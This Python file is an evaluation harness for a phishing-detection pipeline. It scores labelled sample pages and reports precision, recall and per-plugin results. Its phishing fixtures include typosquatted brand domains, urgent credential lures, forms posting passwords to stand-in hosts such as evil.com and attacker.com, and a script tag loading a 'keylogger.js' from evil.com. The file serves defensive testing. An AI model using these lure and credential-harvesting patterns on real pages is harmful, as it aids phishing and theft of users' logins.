"""Detection quality evaluation harness for VigilWolf v2.

Evaluates the full plugin pipeline against a labelled dataset to compute
precision, recall, F1, and per-plugin breakdowns.

Usage:
    python3 eval_detection.py
"""
from plugins.base import SnapshotContext, PluginType
from plugins.login_detector import LoginDetector
from plugins.keyword_detector import KeywordDetector
from plugins.brand_match import BrandMatch
from plugins.external_js_detector import ExternalJSDetector
from plugins.nrd_age_scorer import NRDAgeScorer
from plugins.html_hasher import HTMLHasher
from services.scoring_service import calculate_score, DEFAULT_WEIGHTS

# ---------------------------------------------------------------------------
# Labelled evaluation dataset
# ---------------------------------------------------------------------------

PHISHING_SAMPLES = [
    {"domain": "paypa1-secure-login.com", "html": '<form><input type="password" name="pass"><input type="submit" value="Login"></form>', "text": "Verify your PayPal account immediately. Your account will be suspended.", "forms": [{"has_password": True, "action": "/login"}], "label": "phishing"},
    {"domain": "g00gle-accounts.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Secure your Google account. Unauthorized access detected.", "forms": [{"has_password": True, "action": "/auth"}], "label": "phishing"},
    {"domain": "micros0ft-verify.com", "html": '<form><input type="password"><input type="hidden" name="token" value="x"></form>', "text": "Your Microsoft account has been compromised. Verify immediately.", "forms": [{"has_password": True, "has_hidden": True, "action": "/verify"}], "label": "phishing"},
    {"domain": "amaz0n-order-update.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Amazon account suspended. Confirm your identity to unlock.", "forms": [{"has_password": True, "action": "/unlock"}], "label": "phishing"},
    {"domain": "chase-banking-alert.net", "html": '<form><input type="password"><input type="submit"></form>', "text": "Unauthorized transaction detected. Verify your Chase account immediately.", "forms": [{"has_password": True, "action": "/secure"}], "label": "phishing"},
    {"domain": "login-secure-portal.xyz", "html": '<form action="https://evil.com/steal"><input type="password"></form>', "text": "Verify your credentials. OTP required for security.", "forms": [{"has_password": True, "action": "https://evil.com/steal"}], "label": "phishing"},
    {"domain": "app1e-id-verify.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Your Apple ID has been locked. Restore access immediately.", "forms": [{"has_password": True, "action": "/restore"}], "label": "phishing"},
    {"domain": "netfl1x-payment.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Netflix subscription expired. Update payment to reactivate.", "forms": [{"has_password": True, "action": "/update"}], "label": "phishing"},
    {"domain": "faceb00k-security.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Facebook security alert. Confirm your identity to unlock.", "forms": [{"has_password": True, "action": "/confirm"}], "label": "phishing"},
    {"domain": "dropbox-secure-login.net", "html": '<form><input type="password"><input type="submit"></form>', "text": "Dropbox account suspended. Verify your email to restore access.", "forms": [{"has_password": True, "action": "/verify"}], "label": "phishing"},
    {"domain": "irs-tax-refund-2025.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "IRS refund notification. Validate your identity to claim.", "forms": [{"has_password": True, "action": "/claim"}], "label": "phishing"},
    {"domain": "c0inbase-wallet.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Coinbase security alert. Unauthorized login attempt detected. Verify now.", "forms": [{"has_password": True, "action": "/verify"}], "label": "phishing"},
    {"domain": "docus1gn-review.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "DocuSign: You have a document to review. Confirm your identity.", "forms": [{"has_password": True, "action": "/review"}], "label": "phishing"},
    {"domain": "fedex-tracking-secure.net", "html": '<form><input type="password"><input type="submit"></form>', "text": "FedEx delivery requires verification. Update shipping details.", "forms": [{"has_password": True, "action": "/update"}], "label": "phishing"},
    {"domain": "st3am-community.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Steam account suspended. Verify your login to unlock.", "forms": [{"has_password": True, "action": "/unlock"}], "label": "phishing"},
    {"domain": "bank-login-secure.xyz", "html": '<form><input type="password"></form><script src="https://evil.com/keylogger.js"></script>', "text": "Secure banking login. Verify your account.", "forms": [{"has_password": True, "action": "/login"}], "scripts": [{"src": "https://evil.com/keylogger.js", "inline": False}], "label": "phishing"},
    {"domain": "paypal-verify-2025.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Verify PayPal account. Account suspended.", "forms": [{"has_password": True, "action": "/verify"}], "snapshot_record": {"first_seen": "2026-04-26T00:00:00Z"}, "label": "phishing"},
    {"domain": "wellsfarg0-alert.net", "html": '<form><input type="password"><input type="submit"></form>', "text": "Wells Fargo alert: Unauthorized transaction. Verify immediately.", "forms": [{"has_password": True, "action": "/verify"}], "label": "phishing"},
    {"domain": "secure-login-portal.xyz", "html": '<form><input type="password"><input type="submit"></form>', "text": "Chase Bank account suspended. Verify your Chase identity. OTP required.", "forms": [{"has_password": True, "action": "/login"}], "label": "phishing"},
    {"domain": "bankofamer1ca-verify.com", "html": '<form><input type="hidden" name="sid" value="x"><input type="password"><input type="submit"></form>', "text": "Bank of America security alert. Confirm your identity.", "forms": [{"has_password": True, "has_hidden": True, "action": "/confirm"}], "label": "phishing"},
    {"domain": "paypa1.com", "html": "<html><body>Login</body></html>", "text": "Login to your account", "forms": [], "label": "phishing"},
    {"domain": "secure-login-verify.xyz", "html": '<form><input type="password"><input type="submit"></form>', "text": "Verify your identity. Suspicious activity detected on your account.", "forms": [{"has_password": True, "action": "/verify"}], "label": "phishing"},
    {"domain": "account-locked.net", "html": '<form><input type="password"><input type="submit"></form>', "text": "Account locked. Verify immediately to restore access. Suspicious login attempt.", "forms": [{"has_password": True, "action": "/restore"}], "label": "phishing"},
    {"domain": "login-page-secure.xyz", "html": '<form action="https://attacker.com/phish"><input type="password"></form>', "text": "Verify account", "forms": [{"has_password": True, "action": "https://attacker.com/phish"}], "snapshot_record": {"first_seen": "2026-04-27T00:00:00Z"}, "label": "phishing"},
    {"domain": "amaz0n-secure-verify.net", "html": '<form><input type="password"><input type="hidden" name="t" value="1"><input type="submit"></form>', "text": "Amazon account suspended. Verify immediately. Unauthorized purchase detected.", "forms": [{"has_password": True, "has_hidden": True, "action": "/verify"}], "scripts": [{"src": "https://tracker.evil.com/am.js", "inline": False}], "snapshot_record": {"first_seen": "2026-04-25T00:00:00Z"}, "label": "phishing"},
    {"domain": "instagraam-security.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Instagram: Suspicious login attempt. Verify your identity.", "forms": [{"has_password": True, "action": "/verify"}], "label": "phishing"},
    {"domain": "0utlook-login.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Outlook security alert. Confirm your identity.", "forms": [{"has_password": True, "action": "/confirm"}], "label": "phishing"},
    {"domain": "sp0tify-premium.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Spotify Premium expired. Reactivate now.", "forms": [{"has_password": True, "action": "/reactivate"}], "label": "phishing"},
    {"domain": "zel1e-payment.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "Zelle payment pending. Verify your account.", "forms": [{"has_password": True, "action": "/verify"}], "label": "phishing"},
    {"domain": "whats4pp-web.com", "html": '<form><input type="password"><input type="submit"></form>', "text": "WhatsApp Web: New login detected. Verify your identity.", "forms": [{"has_password": True, "action": "/verify"}], "label": "phishing"},
]

LEGIT_SAMPLES = [
    {"domain": "random-safe-site.org", "html": "<html><body>Safe content about cats and dogs.</body></html>", "text": "Welcome to our website about cats and dogs.", "forms": [], "label": "legit"},
    {"domain": "my-personal-blog.com", "html": "<html><body>Blog about cooking recipes and travel.</body></html>", "text": "Today I made pasta and visited Rome.", "forms": [], "label": "legit"},
    {"domain": "technews-daily.com", "html": "<html><body>Latest technology news and reviews.</body></html>", "text": "New laptop review. Best phones of 2026.", "forms": [], "label": "legit"},
    {"domain": "learn-python.org", "html": "<html><body>Python tutorials for beginners.</body></html>", "text": "Learn Python with our interactive tutorials.", "forms": [], "label": "legit"},
    {"domain": "janedoe-portfolio.com", "html": "<html><body>Web developer portfolio.</body></html>", "text": "I build beautiful websites.", "forms": [], "label": "legit"},
    {"domain": "coolproject.io", "html": "<html><body>Open source project for data visualization.</body></html>", "text": "Check out our latest release.", "forms": [], "label": "legit"},
    {"domain": "charity-water.org", "html": "<html><body>Clean water for everyone.</body></html>", "text": "Donate to provide clean water.", "forms": [{"has_password": False, "action": "/donate"}], "label": "legit"},
    {"domain": "joes-pizza-nyc.com", "html": "<html><body>Best pizza in New York.</body></html>", "text": "Order online or visit us.", "forms": [], "label": "legit"},
    {"domain": "discuss-tech.net", "html": "<html><body>Tech discussion forum.</body></html>", "text": "What do you think about the latest release?", "forms": [], "label": "legit"},
    {"domain": "docs-framework.dev", "html": "<html><body>Framework documentation.</body></html>", "text": "Getting started guide for the framework.", "forms": [], "label": "legit"},
    {"domain": "saas-product.com", "html": "<html><body>Cloud-based project management tool.</body></html>", "text": "Manage your projects efficiently.", "forms": [], "label": "legit"},
    {"domain": "shop-handmade.com", "html": "<html><body>Handmade crafts marketplace.</body></html>", "text": "Browse unique handmade items.", "forms": [], "label": "legit"},
    {"domain": "local-weather.app", "html": "<html><body>Local weather forecasts.</body></html>", "text": "Sunny with a high of 72 degrees.", "forms": [], "label": "legit"},
    {"domain": "fitness-tracker.app", "html": "<html><body>Track your workouts.</body></html>", "text": "Log your daily exercise.", "forms": [], "label": "legit"},
    {"domain": "best-recipes.com", "html": "<html><body>Easy dinner recipes.</body></html>", "text": "Try our 30-minute meals.", "forms": [], "label": "legit"},
    {"domain": "indie-music-blog.com", "html": "<html><body>Indie music reviews.</body></html>", "text": "Album of the week review.", "forms": [], "label": "legit"},
    {"domain": "budget-travel-tips.com", "html": "<html><body>Budget travel advice.</body></html>", "text": "How to travel on a budget.", "forms": [], "label": "legit"},
    {"domain": "github.com", "html": "<html><body>GitHub is where over 100 million developers shape the future of software.</body></html>", "text": "Sign up for GitHub. Secure software development.", "forms": [], "label": "legit"},
    {"domain": "stackoverflow.com", "html": "<html><body>Stack Overflow question and answer site.</body></html>", "text": "Ask questions and get answers.", "forms": [], "label": "legit"},
    {"domain": "wikipedia.org", "html": "<html><body>Free online encyclopedia.</body></html>", "text": "Wikipedia, the free encyclopedia.", "forms": [], "label": "legit"},
    {"domain": "mozilla.org", "html": "<html><body>Firefox browser and internet privacy.</body></html>", "text": "Choose Firefox for a better web.", "forms": [], "label": "legit"},
    {"domain": "python.org", "html": "<html><body>Python programming language.</body></html>", "text": "Welcome to Python.org.", "forms": [], "label": "legit"},
    {"domain": "rust-lang.org", "html": "<html><body>The Rust programming language.</body></html>", "text": "A language empowering everyone to build reliable software.", "forms": [], "label": "legit"},
    {"domain": "npmjs.com", "html": "<html><body>Node package manager.</body></html>", "text": "Build amazing things with npm.", "forms": [], "label": "legit"},
    {"domain": "hub.docker.com", "html": "<html><body>Container image registry.</body></html>", "text": "Find and share container images.", "forms": [], "label": "legit"},
    {"domain": "cloudflare.com", "html": "<html><body>Web infrastructure and security.</body></html>", "text": "Cloudflare protects and accelerates websites.", "forms": [], "label": "legit"},
    {"domain": "stripe.com", "html": "<html><body>Online payment processing.</body></html>", "text": "Payments infrastructure for the internet.", "forms": [], "label": "legit"},
    {"domain": "vercel.com", "html": "<html><body>Frontend cloud platform.</body></html>", "text": "Develop. Preview. Ship.", "forms": [], "label": "legit"},
    {"domain": "netlify.com", "html": "<html><body>Modern web project platform.</body></html>", "text": "Build, deploy, and scale websites.", "forms": [], "label": "legit"},
    {"domain": "openai.com", "html": "<html><body>AI research and deployment.</body></html>", "text": "Creating safe AI that benefits humanity.", "forms": [], "label": "legit"},
]

# Tricky legit — real brands on their real domains with login forms
TRICKY_LEGIT_SAMPLES = [
    {"domain": "paypal.com", "html": '<form><input type="password" name="loginPassword"><input type="submit" value="Log In"></form>', "text": "Log in to your PayPal account. Secure login.", "forms": [{"has_password": True, "action": "/signin"}], "label": "legit"},
    {"domain": "accounts.google.com", "html": '<form><input type="password" name="password"><input type="submit" value="Next"></form>', "text": "Sign in to your Google Account.", "forms": [{"has_password": True, "action": "/login"}], "label": "legit"},
    {"domain": "login.microsoftonline.com", "html": '<form><input type="password"><input type="submit" value="Sign in"></form>', "text": "Sign in to your Microsoft account.", "forms": [{"has_password": True, "action": "/login"}], "label": "legit"},
    {"domain": "amazon.com", "html": '<form><input type="password"><input type="submit" value="Sign-In"></form>', "text": "Amazon Sign In.", "forms": [{"has_password": True, "action": "/ap/signin"}], "label": "legit"},
    {"domain": "appleid.apple.com", "html": '<form><input type="password"><input type="submit" value="Sign In"></form>', "text": "Apple ID Sign In. Manage your Apple ID.", "forms": [{"has_password": True, "action": "/auth"}], "label": "legit"},
    {"domain": "chase.com", "html": '<form><input type="password"><input type="submit" value="Sign In"></form>', "text": "Chase Secure Sign In.", "forms": [{"has_password": True, "action": "/logon"}], "label": "legit"},
    {"domain": "bankofamerica.com", "html": '<form><input type="password"><input type="submit" value="Sign In"></form>', "text": "Sign in to Bank of America Online Banking.", "forms": [{"has_password": True, "action": "/login"}], "label": "legit"},
    {"domain": "wellsfargo.com", "html": '<form><input type="password"><input type="submit" value="Sign On"></form>', "text": "Wells Fargo Sign On.", "forms": [{"has_password": True, "action": "/signon"}], "label": "legit"},
    {"domain": "facebook.com", "html": '<form><input type="password"><input type="submit" value="Log In"></form>', "text": "Log into Facebook.", "forms": [{"has_password": True, "action": "/login"}], "label": "legit"},
    {"domain": "netflix.com", "html": '<form><input type="password"><input type="submit" value="Sign In"></form>', "text": "Sign in to Netflix.", "forms": [{"has_password": True, "action": "/login"}], "label": "legit"},
]

ALL_SAMPLES = PHISHING_SAMPLES + LEGIT_SAMPLES + TRICKY_LEGIT_SAMPLES

# ---------------------------------------------------------------------------
# Plugin pipeline (detection plugins only — these contribute to scoring)
# ---------------------------------------------------------------------------

DETECTION_PLUGINS = [
    LoginDetector(),
    KeywordDetector(),
    BrandMatch(),
    ExternalJSDetector(),
    NRDAgeScorer(),
]


def _make_context(sample: dict) -> SnapshotContext:
    return SnapshotContext(
        snapshot_id="eval-snap",
        domain=sample["domain"],
        html=sample["html"],
        text=sample["text"],
        forms=sample.get("forms", []),
        links=sample.get("links", []),
        scripts=sample.get("scripts", []),
        metadata=sample.get("metadata", {}),
        snapshot_record=sample.get("snapshot_record", {}),
    )


def evaluate(threshold_high: int = 70, threshold_medium: int = 40) -> dict:
    """Run all detection plugins against the labelled dataset and compute metrics."""
    results: list[dict] = []

    for sample in ALL_SAMPLES:
        ctx = _make_context(sample)
        plugin_results = []
        for plugin in DETECTION_PLUGINS:
            try:
                result = plugin.run(ctx)
                plugin_results.append(result)
            except Exception as e:
                print(f"  WARN: {plugin.name} failed on {sample['domain']}: {e}")

        scored = calculate_score(plugin_results, DEFAULT_WEIGHTS)
        score = scored["score"]
        predicted = "phishing" if score >= threshold_medium else "legit"
        results.append({
            "domain": sample["domain"],
            "label": sample["label"],
            "predicted": predicted,
            "score": score,
            "risk_level": scored["risk_level"],
            "reasons": scored["reasons"],
        })

    # Confusion matrix
    tp = sum(1 for r in results if r["label"] == "phishing" and r["predicted"] == "phishing")
    fp = sum(1 for r in results if r["label"] == "legit" and r["predicted"] == "phishing")
    fn = sum(1 for r in results if r["label"] == "phishing" and r["predicted"] == "legit")
    tn = sum(1 for r in results if r["label"] == "legit" and r["predicted"] == "legit")

    precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0.0

    print(f"\n{'='*60}")
    print("DETECTION QUALITY EVALUATION")
    print(f"{'='*60}")
    print(f"Thresholds: high={threshold_high}, medium={threshold_medium}")
    print(f"Samples: {len(PHISHING_SAMPLES)} phishing, {len(LEGIT_SAMPLES)} legit, {len(TRICKY_LEGIT_SAMPLES)} tricky-legit")
    print(f"\nConfusion Matrix:")
    print(f"  TP={tp}  FP={fp}")
    print(f"  FN={fn}  TN={tn}")
    print(f"\nPrecision: {precision:.3f}")
    print(f"Recall:    {recall:.3f}")
    print(f"F1:        {f1:.3f}")

    # Per-plugin breakdown
    print(f"\nPer-Plugin Breakdown:")
    for plugin in DETECTION_PLUGINS:
        plugin_scores = []
        for sample in ALL_SAMPLES:
            ctx = _make_context(sample)
            try:
                result = plugin.run(ctx)
                plugin_scores.append({
                    "domain": sample["domain"],
                    "label": sample["label"],
                    "score": result.score_contribution,
                    "tags": result.tags,
                })
            except Exception:
                pass
        avg_phish = sum(s["score"] for s in plugin_scores if s["label"] == "phishing") / max(len(PHISHING_SAMPLES), 1)
        avg_legit = sum(s["score"] for s in plugin_scores if s["label"] == "legit") / max(len(LEGIT_SAMPLES) + len(TRICKY_LEGIT_SAMPLES), 1)
        print(f"  {plugin.name:25s} avg_phish={avg_phish:6.1f}  avg_legit={avg_legit:6.1f}  separation={avg_phish - avg_legit:6.1f}")

    # Score distribution
    phish_scores = [r["score"] for r in results if r["label"] == "phishing"]
    legit_scores = [r["score"] for r in results if r["label"] == "legit"]
    if phish_scores:
        print(f"\nScore Distribution:")
        print(f"  Phishing: min={min(phish_scores)} max={max(phish_scores)} avg={sum(phish_scores)/len(phish_scores):.1f}")
    if legit_scores:
        print(f"  Legit:    min={min(legit_scores)} max={max(legit_scores)} avg={sum(legit_scores)/len(legit_scores):.1f}")

    # False positives
    fps = [r for r in results if r["label"] == "legit" and r["predicted"] == "phishing"]
    if fps:
        print(f"\nFalse Positives ({len(fps)}):")
        for r in fps:
            print(f"  {r['domain']:40s} score={r['score']:3d}  reasons={r['reasons']}")

    # False negatives
    fns = [r for r in results if r["label"] == "phishing" and r["predicted"] == "legit"]
    if fns:
        print(f"\nFalse Negatives ({len(fns)}):")
        for r in fns:
            print(f"  {r['domain']:40s} score={r['score']:3d}  reasons={r['reasons']}")

    print(f"\n{'='*60}")

    return {
        "precision": precision,
        "recall": recall,
        "f1": f1,
        "confusion_matrix": {"tp": tp, "fp": fp, "fn": fn, "tn": tn},
        "results": results,
    }


if __name__ == "__main__":
    evaluate()